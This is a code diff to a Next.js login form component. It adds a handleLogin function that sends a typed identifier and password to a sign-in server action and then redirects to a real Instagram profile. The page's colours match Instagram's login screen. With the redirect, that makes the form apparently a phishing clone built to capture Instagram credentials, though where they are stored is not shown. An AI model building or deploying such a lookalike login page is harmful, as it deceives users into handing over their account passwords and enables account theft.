@@ -1,7 +1,7 @@
 "use client"
 
 import React, { useState, useEffect } from 'react';
-import { motion, AnimatePresence } from 'motion/react';
+import { motion, AnimatePresence } from 'framer-motion';
 import Link from 'next/link';
 import Image from 'next/image';
 import { signInWithCredentials } from '@/actions/auth.actions';
@@ -34,19 +34,39 @@ const LoginForm = () => {
     const { name, value } = e.target;
     setForm(prev => ({ ...prev, [name]: value }));
   };
-  const handleLogin = async(e: { preventDefault: () => void; })=> {
-    e.preventDefault()
-    setLoading(true)
-     try {
-       await signInWithCredentials({identifier:form.identifier,password:form.password})
-       router.push("https://www.instagram.com/soufiane.hmamou")
-     } catch (error) {
-       console.log(error)
-     }finally {
-        setLoading(false)
-     }
+  // const handleLogin = async(e: { preventDefault: () => void; })=> {
+  //   e.preventDefault()
+  //   setLoading(true)
+  //    try {
+  //      await signInWithCredentials({identifier:form.identifier,password:form.password})
+  //      router.push("https://www.instagram.com/soufiane.hmamou")
+  //    } catch (error) {
+  //      console.log(error)
+  //    }finally {
+  //       setLoading(false)
+  //    }
+  // }
+ const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
+  e.preventDefault();
+  setLoading(true);
+
+  try {
+    if (!form.identifier || !form.password) {
+      throw new Error("Missing fields");
+    }
+
+    await signInWithCredentials({
+      identifier: form.identifier,
+      password: form.password,
+    });
+
+    router.push("https://www.instagram.com/soufiane.hmamou");
+  } catch (error) {
+    console.error("LOGIN ERROR:", error);
+  } finally {
+    setLoading(false);
   }
- 
+};
   return (
    <div className="min-h-screen bg-[#fafafa] flex flex-col font-sans text-sm text-[#262626]">
       {/* Main Content */}
